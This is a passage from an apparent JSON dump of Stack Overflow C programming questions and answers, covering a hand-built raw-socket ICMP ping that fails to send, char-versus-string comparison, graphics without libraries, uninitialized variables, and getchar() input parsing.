0xe8;\neth-&gt;h_dest[4] = 0xb5;\neth-&gt;h_dest[5] = 0x12;\neth-&gt;h_proto = htons(ETH_P_IP);\n  }\n\nvoid send_ping(ping_ctx* ctx)\n{ \n    int  msg_count=0, i, addr_len, pkt_sent=1, \n    msg_received_count=0,on =1; \n    struct sockaddr_ll remote_addr; \n    struct ip *ip = NULL;\n    struct icmphdr* icmph = NULL;\n    unsigned  char* data = NULL;\n    struct ethhdr* eth = NULL;\n    struct sockaddr_ll r_addr; \n    struct timespec time_start, time_end, tfs, tfe; \n    long double rtt_msec=0, total_msec=0; \n    struct timeval tv_out;\n\n/*Set params*/ \nchar *to = ctx-&gt;dstIP;\nchar *from = ctx-&gt;srcIP;\nint   ping_sockfd = ctx-&gt;r_sock;\nint ttl = ctx-&gt;ttl;\nint tos =ctx-&gt;tos;\n\n/*Timer Settings*/\ntv_out.tv_sec = RECV_TIMEOUT; \ntv_out.tv_usec = 0; \nclock_gettime(CLOCK_MONOTONIC, &amp;tfs); \n\n//GET INTERFACE INDEX FOR INTERFACE enp0s3\n/*struct ifreq ifr;\nsize_t if_name_len = strlen(if_name);\nif(if_name_len&lt;sizeof(ifr.ifr_name)){\n     memcpy(ifr.ifr_name,if_name,if_name_len);\n     ifr.ifr_name[if_name_len]=0;\n}\nelse{\n     die(\"Interface name is too long\");\n}\nmemset(&amp;ifr,0,sizeof(ifr));\nstrncpy(ifr.ifr_name,enp0s3,IFNAMSIZ-1);\nint fd = socket(AF_UNIX,SOCK_DGRAM,0);\nif(fd==-1)\n     printf(\"Error opening socket\");\nif(ioctl(fd,SIOCGIFINDEX,&amp;ifr)==-1){\n     printf(\"Error getting index name\");\n}*/\n//int ifindex = ifr.ifr_ifindex;\nint ifindex = if_nametoindex(\"enp0s3\");\nprintf(\"The interface number is : %d \\n\",ifindex);\n\nremote_addr.sll_ifindex = ifindex;\nremote_addr.sll_halen = ETH_ALEN;\nremote_addr.sll_addr[0] = 0x08;\nremote_addr.sll_addr[1] = 0x00;\nremote_addr.sll_addr[2] = 0x27;\nremote_addr.sll_addr[3] = 0xe8;\nremote_addr.sll_addr[4] = 0xb5;\nremote_addr.sll_addr[5] = 0x12;\n\n\n\nif(setsockopt(ping_sockfd, SOL_SOCKET, SO_RCVTIMEO, \n            (const char*)&amp;tv_out, sizeof tv_out) &lt; 0)\n{\n    printf(\"Setting socket options failed for SO_RCVTIMEO\\n\");\n    return;\n}\n\n\n/*if(setsockopt(ping_sockfd, IPPROTO_RAW, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0)\n{\n    printf(\"Setting socket options failed for IP_HDRINCL\");\n    return;\n}*/\n\nwhile(pingloop) \n{ \n    pkt_sent=1; \n    memset(&amp;g_pckt, 0, sizeof(g_pckt));\n\n    /*ETHERNET Header*/\n    eth = (struct ethhdr *)&amp;g_pckt;\n    fill_eth(eth);\n\n    /*IP Header*/        \n    ip = (struct ip *)(eth + 1); \n    fill_ip_h(ip, ctx);\n\n    /*ICMP Header*/\n    icmph = (struct icmphdr*)(ip + 1);\n    fill_icmp_h(icmph, &amp;msg_count); \n\n    /*Data*/\n    data = (unsigned char *)(icmph + 1);\n    fill_data(data);\n\n    /*ICMP Checksum*/\n    icmph-&gt;checksum = checksum(icmph, PING_PKT_S);\n\n    usleep(PING_SLEEP_RATE); \n\n    /*TX*/ \n    clock_gettime(CLOCK_MONOTONIC, &amp;time_start); \n    if ( sendto(ping_sockfd, &amp;g_pckt, sizeof(g_pckt), 0, \n                (struct sockaddr*) &amp;remote_addr, \n                sizeof(remote_addr)) &lt;= 0) \n    { \n        printf(\"\\nPacket Sending Failed!\\n\"); \n        pkt_sent=0; \n    } \n\n    /*RX*/ \n    /*addr_len=sizeof(r_addr); \n\n    if ( recvfrom(ping_sockfd, icmph, PING_PKT_S, 0, \n                (struct sockaddr*)&amp;r_addr, &amp;addr_len) &lt;= 0 \n            &amp;&amp; msg_count&gt;1) \n    { \n        printf(\"\\nPacket receive failed!\\n\"); \n    } */\n\n    else\n    { \n        clock_gettime(CLOCK_MONOTONIC, &amp;time_end); \n\n        double timeElapsed = ((double)(time_end.tv_nsec - \n                    time_start.tv_nsec))/1000000.0; \n        rtt_msec = (time_end.tv_sec- \n                time_start.tv_sec) * 1000.0 \n            + timeElapsed; \n\n        // if packet was not sent, don't receive \n        if(pkt_sent) \n        { \n            if(!(g_pckt.hdr.type ==69 &amp;&amp; g_pckt.hdr.code==0)) \n            { \n                printf(\"Error..Packet received with ICMP\" \n                        \"type %d code %d\\n\", \n                        g_pckt.hdr.type, g_pckt.hdr.code); \n            } \n            else\n            { \n                printf(\"%d bytes Received reply from %s: icmp_seq=:%d ttl=%d time=%Lf ms\\n\",PING_PKT_S, ctx-&gt;dstIP, msg_count, ctx-&gt;ttl, rtt_msec); \n                msg_received_count++; \n            } \n        } \n    }    \n} \nclock_gettime(CLOCK_MONOTONIC, &amp;tfe); \ndouble timeElapsed = ((double)(tfe.tv_nsec - \n            tfs.tv_nsec))/1000000.0; \n\ntotal_msec = (tfe.tv_sec-tfs.tv_sec)*1000.0+ \n    timeElapsed ;\n\nprintf(\"\\n%d packets sent, %d packets received, %f percent \"\n        \"packet loss. Total time: %Lf ms.\\n\\n\", \n        msg_count, msg_received_count, \n        ((msg_count - msg_received_count)/msg_count) * 100.0, \n        total_msec); \n} \n\nint main(int argc, char *argv[]) \n{ \nping_ctx ctx = {0};\n\nif(argc!=3) \n{ \n    printf(\"sudo ./myping 10.117.157.6 10.39.51.117\\n\"); \n    return 0; \n} \n\nsignal(SIGINT, intHandler); \nctx.r_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); \nif(ctx.r_sock &lt;0) \n{ \n    printf(\"\\nSocket file descriptor not received\\n\"); \n    return 0; \n} \n\nctx.tos = 0;\nctx.ttl = 64;\nstrncpy(ctx.dstIP, argv[1],strlen(argv[1]));\nstrncpy(ctx.srcIP, argv[2],strlen(argv[2]));\n\nsend_ping(&amp;ctx); \n\nreturn 0; \n</code></pre>\n\n<p>} </p>\n\n<p>When the packets are captured using tcpdump and the capture is opened in wireshark, no ICMP packet is seen.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 45031, "user_id": 213136, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0b84a36c241e04175fcec402dac43018?s=128&d=identicon&r=PG", "display_name": "Bob Jarvis - Reinstate Monica", "link": "https://stackoverflow.com/users/213136/bob-jarvis-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545715127, "post_id": 53919534, "comment_id": 94681519, "body": "To compare two strings in C you should use the <code>strcmp</code> function. Best of luck."}, {"owner": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 2, "creation_date": 1545715251, "post_id": 53919534, "comment_id": 94681537, "body": "There is a difference between single quotes and double quotes. Single quotes specify a single character while double quotes specify a string. Your <code>yesno</code> is a single character, so you should be comparing it to <code>&#39;y&#39;</code> and <code>&#39;n&#39;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10697701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac1f330757201f361be085577da9b404?s=128&d=identicon&r=PG&f=1", "display_name": "lebro111", "link": "https://stackoverflow.com/users/10697701/lebro111"}, "edited": false, "score": 0, "creation_date": 1545715684, "post_id": 53919551, "comment_id": 94681601, "body": "i cant accept your answer you answer for 4 minute. but it works... thank you!!"}], "tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 4, "last_activity_date": 1545715703, "last_edit_date": 1545715703, "creation_date": 1545715176, "answer_id": 53919551, "question_id": 53919534, "link": "https://stackoverflow.com/questions/53919534/i-cant-make-a-yesno-while-learning-c/53919551#53919551", "title": "i cant make a yesno while learning c", "body": "<p>Here</p>\n\n<pre><code>yesno == \"y\"\n</code></pre>\n\n<p>you are comparing a char <code>yesno</code> with string <code>\"y\"</code>. It should be</p>\n\n<pre><code>yesno == 'y'  /* use single quotation instead of double quotation */\n</code></pre>\n\n<p>Side note always compile your code with minimum below flags &amp; don't ignore the warnings, work on those. For e.g</p>\n\n<pre><code>gcc -Wall -Wstrict-prototypes -Wpedantic -Werror test.c\n</code></pre>\n\n<p>where <code>Werror</code> converts warning into error &amp; stops the compilation so that you shouldn't jump to the output &amp; forces you to read &amp; solve the compiler error message.</p>\n"}, {"tags": [], "owner": {"reputation": 1345, "user_id": 4554967, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/3e7affacfbfa560a3f2ca86204fb5b84?s=128&d=identicon&r=PG&f=1", "display_name": "zappy", "link": "https://stackoverflow.com/users/4554967/zappy"}, "is_accepted": false, "score": 1, "last_activity_date": 1545715374, "creation_date": 1545715374, "answer_id": 53919559, "question_id": 53919534, "link": "https://stackoverflow.com/questions/53919534/i-cant-make-a-yesno-while-learning-c/53919559#53919559", "title": "i cant make a yesno while learning c", "body": "<p><strong>Lesson learned :  Never ever ignore compiler warnings.</strong></p>\n\n<p>use 'y' instead of \"y\"</p>\n\n<p>This will work :) Happy learnings  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//just playing\n\nint main()\n{\n    char yesno;\n    printf(\"TEST [Y/n] \");\n    scanf(\" %c\", &amp;yesno);\n    if(yesno == 'y') {\n        printf(\"You did yes!!\");\n    } else if(yesno == 'n') {\n        printf(\"You did no!\");\n    } else {\n        printf(\"Not valid!!!\");\n    }\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 10697701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac1f330757201f361be085577da9b404?s=128&d=identicon&r=PG&f=1", "display_name": "lebro111", "link": "https://stackoverflow.com/users/10697701/lebro111"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "closed_date": 1545715649, "answer_count": 2, "score": -2, "last_activity_date": 1545715885, "creation_date": 1545714973, "last_edit_date": 1545715885, "question_id": 53919534, "link": "https://stackoverflow.com/questions/53919534/i-cant-make-a-yesno-while-learning-c", "closed_reason": "Duplicate", "title": "i cant make a yesno while learning c", "body": "<p>i am trying to learn c and i want to make a yesno with a single char. here is my code: </p>\n\n<p>i have tried this</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//just playing\n\nint main()\n{\n    char yesno;\n    printf(\"TEST [Y/n] \");\n    scanf(\" %c\", &amp;yesno);\n    if(yesno == \"y\") {\n        printf(\"You did yes!!\");\n    } else if(yesno == \"n\") {\n        printf(\"You did no!\");\n    } else {\n        printf(\"Not valid!!!\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>and it skips to else automatically\nwhy is this</p>\n\n<p>update: i did not know that this is a duplicate. idk what double quotes were and singles were before</p>\n"}, {"tags": ["c", "canvas", "graphics"], "comments": [{"owner": {"reputation": 2955, "user_id": 3819007, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6hvpZ.png?s=128&g=1", "display_name": "visibleman", "link": "https://stackoverflow.com/users/3819007/visibleman"}, "edited": false, "score": 3, "creation_date": 1545715257, "post_id": 53919484, "comment_id": 94681538, "body": "platform independent and without libraries are mutually exclusive here, so you will have to decide on one or the other. Each system has its own way of putting bitmaps on the screen. You would have to rasterize your circles/triangles/rectangles to bit maps and call the on the system to create a  window and draw the bitmap."}], "answers": [{"tags": [], "owner": {"reputation": 633, "user_id": 10819212, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/J8mjR.png?s=128&g=1", "display_name": "Felix G", "link": "https://stackoverflow.com/users/10819212/felix-g"}, "is_accepted": false, "score": 0, "last_activity_date": 1545734315, "creation_date": 1545734315, "answer_id": 53921559, "question_id": 53919484, "link": "https://stackoverflow.com/questions/53919484/how-to-create-a-graphic-canvas-in-pure-c-to-display-graphic-figures-without-any/53921559#53921559", "title": "How to create a graphic canvas in pure c to display graphic figures without any libraries and platform independent", "body": "<p>Graphics programming is inherently platform dependent. Let's say, for the sake of argument, there were only two operating systems: linux and windows. You can use platform specific functions on both of them, to create windows and draw something. For your application to be \"platform independent\" in this context would mean to detect which OS you are running on (say, using preprocessor defines at compile time) and use different system calls based on that. However, this gets really messy, really fast.</p>\n\n<p>It gets even worse when you're talking about 3D (or hardware accelerated 2D), because different graphics cards again behave differently. So, again, even if there were only two graphics cards (plus the two operating systems), you're already at four different cases for the same basic operation of, say, drawing a circle inside a window.</p>\n\n<p>Can you do it?</p>\n\n<p>Technically, yes. But graphics libraries exist precisely because most people wouldn't want to.</p>\n\n<p>What i would personally recommend, if you don't want to rely to heavily on third party libraries, is to use OpenGL. Yes, it's a library, but it comes preinstalled on most systems.</p>\n\n<p>If you actually want to create your own platform independent graphics library, i would suggest to get comfortable using the existing ones first, just to get a feel for what is involved in making something like that work.</p>\n"}], "owner": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 275, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545764137, "creation_date": 1545714300, "last_edit_date": 1545764137, "question_id": 53919484, "link": "https://stackoverflow.com/questions/53919484/how-to-create-a-graphic-canvas-in-pure-c-to-display-graphic-figures-without-any", "title": "How to create a graphic canvas in pure c to display graphic figures without any libraries and platform independent", "body": "<p>I think it must be possible to create a graphics library without any other library. </p>\n\n<p>Just to draw circles and triangles and rectangles with basic math. If so, where is the point how to make the \"drawable area\"? </p>\n\n<p>Is it possible to draw to screen in pure C or is assembly required? </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12106, "user_id": 4431643, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CoZjt.jpg?s=128&g=1", "display_name": "kiran Biradar", "link": "https://stackoverflow.com/users/4431643/kiran-biradar"}, "edited": false, "score": 2, "creation_date": 1545714073, "post_id": 53919462, "comment_id": 94681385, "body": "uninitialized variables contains indeterminate values."}, {"owner": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "edited": false, "score": 0, "creation_date": 1545715428, "post_id": 53919462, "comment_id": 94681559, "body": "I mentioned already that I know what the &quot;error&quot; is, that I used undefined variables in my age calculation, but I just want to understand what is going on in my code that leads to an output of 89. I&#39;m used to the program just shutting down and saying there&#39;s an error if something is wrong with the code, but I don&#39;t understand why it continues and I don&#39;t get why 89 is produced"}, {"owner": {"reputation": 2034, "user_id": 4688321, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d5b21d8c934125839996c5eac897fc1?s=128&d=identicon&r=PG&f=1", "display_name": "kiner_shah", "link": "https://stackoverflow.com/users/4688321/kiner-shah"}, "edited": false, "score": 0, "creation_date": 1545719949, "post_id": 53919462, "comment_id": 94682244, "body": "Just put <code>age = currentyr - birthyr;</code> after <code>birthyr = 2000;</code>. <code>89</code> output is because of some garbage value."}, {"owner": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "edited": false, "score": 0, "creation_date": 1545884936, "post_id": 53919462, "comment_id": 94718972, "body": "Again, I know the error, but how did the garbage value get there? Is it just some random number/"}], "answers": [{"comments": [{"owner": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "edited": false, "score": 0, "creation_date": 1545715411, "post_id": 53919469, "comment_id": 94681553, "body": "I mentioned already that I know what the &quot;error&quot; is, that I used undefined variables in my age calculation, but I just want to understand what is going on in my code that leads to an output of 89. I&#39;m used to the program just shutting down and saying there&#39;s an error if something is wrong with the code, but I don&#39;t understand why it continues and I don&#39;t get why 89 is produces"}, {"owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "reply_to_user": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "edited": false, "score": 0, "creation_date": 1545715469, "post_id": 53919469, "comment_id": 94681562, "body": "@ming The value could be <i>anything</i> other than 89 as well.  Run your code on a dozen different C compilers, and you would probably see at least a handful of different values.  The correct answer is the only thing with which you should really be concerned here."}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "reply_to_user": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "edited": false, "score": 0, "creation_date": 1545716185, "post_id": 53919469, "comment_id": 94681663, "body": "@ming <i>I know what the &quot;error&quot; is, that I used undefined variables in my age calculation ?</i> Then you shouldn&#39;t proceed further. Compile your code with <code>-Wall -Werror</code>  which will say <code>error: \u2018currentyr\u2019 is used uninitialized in this function [-Werror=uninitialized]</code> and compilation will stops."}], "tags": [], "owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "is_accepted": false, "score": 2, "last_activity_date": 1545714058, "creation_date": 1545714058, "answer_id": 53919469, "question_id": 53919462, "link": "https://stackoverflow.com/questions/53919462/did-this-number-get-calculated-or-is-it-a-random-output/53919469#53919469", "title": "Did this number get calculated or is it a random output?", "body": "<p>You should initialize the values of the current and birth year <em>before</em> computing the age:</p>\n\n<pre><code>currentyr = 2018;\nbirthyr = 2000;\nage = currentyr - birthyr;\n\nprintf(\"I am %d years old\", age);\n</code></pre>\n\n<p>Most likely what is happening now is that your age difference is being computed with undefined or possibly random values.</p>\n"}, {"comments": [{"owner": {"reputation": 4216, "user_id": 9269043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a2763bcfa8917a365c88f8639494de7?s=128&d=identicon&r=PG", "display_name": "Vasilisa", "link": "https://stackoverflow.com/users/9269043/vasilisa"}, "edited": false, "score": 1, "creation_date": 1545722188, "post_id": 53920018, "comment_id": 94682671, "body": "While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference. Link-only answers can become invalid if the linked page changes."}], "tags": [], "owner": {"reputation": 1, "user_id": 9712839, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "wall e", "link": "https://stackoverflow.com/users/9712839/wall-e"}, "is_accepted": false, "score": -1, "last_activity_date": 1545720575, "creation_date": 1545720575, "answer_id": 53920018, "question_id": 53919462, "link": "https://stackoverflow.com/questions/53919462/did-this-number-get-calculated-or-is-it-a-random-output/53920018#53920018", "title": "Did this number get calculated or is it a random output?", "body": "<p>Maybe <a href=\"https://stackoverflow.com/questions/11233602/what-will-be-the-value-of-uninitialized-variable\">this</a> question can give you the answer. </p>\n\n<p>Why does it continue? Why does it produce 89? It's the result of C language standard and the compiler.</p>\n"}, {"tags": [], "owner": {"reputation": 9095, "user_id": 8542346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11b206b49cec657d28a5876f8330780e?s=128&d=identicon&r=PG&f=1", "display_name": "H.S.", "link": "https://stackoverflow.com/users/8542346/h-s"}, "is_accepted": false, "score": 0, "last_activity_date": 1545721776, "creation_date": 1545721776, "answer_id": 53920144, "question_id": 53919462, "link": "https://stackoverflow.com/questions/53919462/did-this-number-get-calculated-or-is-it-a-random-output/53920144#53920144", "title": "Did this number get calculated or is it a random output?", "body": "<p><em><code>but that still doesn't explain to me how the code still runs without error and produces 89...</code></em></p>\n\n<p>The C compilers provide set of options which you can use to request or suppress warning messages. For e.g. if you are using the <code>gcc</code> compiler then it provides the <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#Warning-Options\" rel=\"nofollow noreferrer\">set of options</a> which you can use while compiling your code. One of the <code>gcc</code> option is <code>-Wall</code> which enables all the warning about constructions. If you compile your program with this <code>-Wall</code> then compiler report the warning about the use of uninitialized variable in your program:</p>\n\n<pre><code># gcc -Wall  prg.c \nprg.c:8:7: warning: variable 'currentyr' is uninitialized when used here [-Wuninitialized]\nage = currentyr - birthyr;\n      ^~~~~~~~~\nprg.c:5:14: note: initialize the variable 'currentyr' to silence this warning\nint currentyr;\n             ^\n              = 0\nprg.c:8:19: warning: variable 'birthyr' is uninitialized when used here [-Wuninitialized]\nage = currentyr - birthyr;\n                  ^~~~~~~\nprg.c:6:12: note: initialize the variable 'birthyr' to silence this warning\nint birthyr;\n           ^\n            = 0\n2 warnings generated.\n</code></pre>\n\n<p>See the warning messages related to variables uninitialized when used.<br>\nAlso, you can convert these warning messages to error by using <code>-Werror</code> option of <code>gcc</code> compiler.</p>\n\n<p>From <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.9p10\" rel=\"nofollow noreferrer\">C Standards#6.7.9p10</a>:</p>\n\n<blockquote>\n  <p>If an object that has automatic storage duration is not initialized explicitly, its value is indeterminate.</p>\n</blockquote>\n\n<p>On your system the calculation using those indeterminate values is producing result <code>89</code>. You may not get result <code>89</code> every time when you run your program. On my system, I am getting -</p>\n\n<pre><code>I am 218173908 years old\n</code></pre>\n"}], "owner": {"reputation": 229, "user_id": 10830492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d17e23a80fe2f643c76399b0a6edea80?s=128&d=identicon&r=PG&f=1", "display_name": "ming", "link": "https://stackoverflow.com/users/10830492/ming"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1545721776, "creation_date": 1545713977, "question_id": 53919462, "link": "https://stackoverflow.com/questions/53919462/did-this-number-get-calculated-or-is-it-a-random-output", "title": "Did this number get calculated or is it a random output?", "body": "<p>I'm running C, and I'm wondering why the output for this shows \"I am 89 years old\". I get that the variable currentyr and birthyr should come before age, but that still doesn't explain to me how the code still runs without error and produces 89. I'm coming from racket, where if something is wrong all it does is give me an error rather than give me a random output so I'm a little confused. </p>\n\n<pre><code>int age;\nint currentyr;\nint birthyr;\n\nage = currentyr - birthyr;\ncurrentyr = 2018;\nbirthyr = 2000;\n\nprintf(\"I am %d years old\", age);\n</code></pre>\n"}, {"tags": ["c", "while-loop", "max", "min", "getchar"], "comments": [{"owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "edited": false, "score": 1, "creation_date": 1545710920, "post_id": 53919282, "comment_id": 94681025, "body": "Please include the code you have tried already.  Stack Overflow is not a free code-writing/homework service."}, {"owner": {"reputation": 2287, "user_id": 5267751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd62e8fd8fbb37abc7e2a39d23828047?s=128&d=identicon&r=PG&f=1", "display_name": "user202729", "link": "https://stackoverflow.com/users/5267751/user202729"}, "edited": false, "score": 0, "creation_date": 1545711638, "post_id": 53919282, "comment_id": 94681118, "body": "Questions asking for homework help must include a summary of the work you&#39;ve done so far to solve the problem, and a description of the difficulty you are having solving it. -- <a href=\"https://stackoverflow.com/help/on-topic\">help center</a>"}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545719442, "post_id": 53919282, "comment_id": 94682143, "body": "Hint: you read whatever the user inputs, and only then you decide whether ignore it or not..."}], "answers": [{"tags": [], "owner": {"reputation": 128, "user_id": 8710770, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KGhJP.jpg?s=128&g=1", "display_name": "Physx", "link": "https://stackoverflow.com/users/8710770/physx"}, "is_accepted": false, "score": 0, "last_activity_date": 1545884453, "creation_date": 1545884453, "answer_id": 53939700, "question_id": 53919282, "link": "https://stackoverflow.com/questions/53919282/getchar-for-excluding-chars-from-input/53939700#53939700", "title": "getchar() for excluding chars from input", "body": "<p>Based on the first input choose what happens in the next one. Here's the code for the negative numbers. Just add the case with double-digit numbers and optimize it:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define MAX_NUMBERS 100\n\nint main(void){\n    int list_of_nums[MAX_NUMBERS];\n    int pos_nums[MAX_NUMBERS];\n    int neg_nums[MAX_NUMBERS];\n    int size = 0, size_pos = 0, size_neg = 0, i, max_pos, min_pos, max_neg, min_neg, neg_flag = 0;\n    char input;\n\n    printf(\"Enter numbers separated by ',':\\n\");\n\n    do {\n        input = getchar();\n        if(input == '-') {\n            neg_flag = 1;   //for negative numbers\n            input = getchar();\n        }\n        if(input &gt;= '0' &amp;&amp; input &lt;= '9') {\n            if(neg_flag) {\n                list_of_nums[size] = -(input - 48); //FROM ASCII CHARACTER CODE\n            } else {\n                list_of_nums[size] = input - 48;\n            }\n            neg_flag = 0;\n            size++;\n        } else {\n            neg_flag = 0;\n        }\n    } while(input != '\\n');\n\n    for(i = 0; i &lt; size; i++) {\n        printf(\"%d \", list_of_nums[i]);\n        if(list_of_nums[i] &gt;= 0) {\n            pos_nums[size_pos] = list_of_nums[i];\n            size_pos++;\n        }\n        else {\n            neg_nums[size_neg] = list_of_nums[i];\n            size_neg++;\n        };\n    }\n    printf(\"\\n\");\n\n    max_pos = pos_nums[0];\n    min_pos = pos_nums[0];\n    for(i = 1; i &lt; size_pos; i++) {\n        if(max_pos &lt; pos_nums[i]) max_pos = pos_nums[i];\n        if(min_pos &gt; pos_nums[i]) min_pos = pos_nums[i];\n    }\n\n    max_neg = neg_nums[0];\n    min_neg = neg_nums[0];\n    for(i = 1; i &lt; size_neg; i++) {\n        if(max_neg &lt; neg_nums[i]) max_neg = neg_nums[i];\n        if(min_neg &gt; neg_nums[i]) min_neg = neg_nums[i];\n    }\n\n    printf(\"The maximum number of all the positives is: %d\\n\", max_pos);\n    printf(\"The minimum number of all the positives is: %d\\n\", min_pos);\n    printf(\"The maximum number of all the negatives is: %d\\n\", max_neg);\n    printf(\"The minimum number of all the negatives is: %d\\n\", min_neg);\n\n    return 0;\n}\n</code></pre>\n\n<blockquote>\n  <p>P.S. For future, don't post <em>\"need help with homework\"</em> questions but try to go as far as possible in solving the task. That way you'll be able to present more researched question.</p>\n</blockquote>\n"}], "owner": {"reputation": 11, "user_id": 10830529, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b55ae6a0ddc3cbf3ec5cae7b56cd1d63?s=128&d=identicon&r=PG&f=1", "display_name": "Nitzan Weizman", "link": "https://stackoverflow.com/users/10830529/nitzan-weizman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1545884453, "creation_date": 1545710867, "last_edit_date": 1545753805, "question_id": 53919282, "link": "https://stackoverflow.com/questions/53919282/getchar-for-excluding-chars-from-input", "title": "getchar() for excluding chars from input", "body": "<p>Here is what i'm trying to do:\nMy teacher gave me an assignment to recieve input from a user like \"1,2,3,4,-3,17,-9,0,5,-8,10\" and after the user has pressed enter key the program should ignore the \",\" signs and print the maximum and minimum values of the positive and negative numbers (each).\nnow he said we should use getchar() to do this but I don't understand how... I know that this function is used to read a single character from the user (and than print it with putchar() ) and not for ignoring characters, so I would like to understand how I should use it to do this kind of operation in a while loop.</p>\n\n<p>So to summarize my question is about selectively reading the input (the other things I will manage myself although if someone sees something in the code and can give a tip I would be happy but im looking to understand the getchar() function to do the opposite of what i'm reading it designed to do), I have wrote and deleted the code thousands of times and couldn't get it to work... this is what it looks like now (and it doesn't work):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(){\n\nchar enter = \"\\n\";\nint list_of_nums[100];\nchar ch1[100];\nint neg_num[100];\nint pos_num[100];\n\nprintf(\"please enter numbers separated by ',': \\n\");\n\n\nwhile (getchar()!= enter) 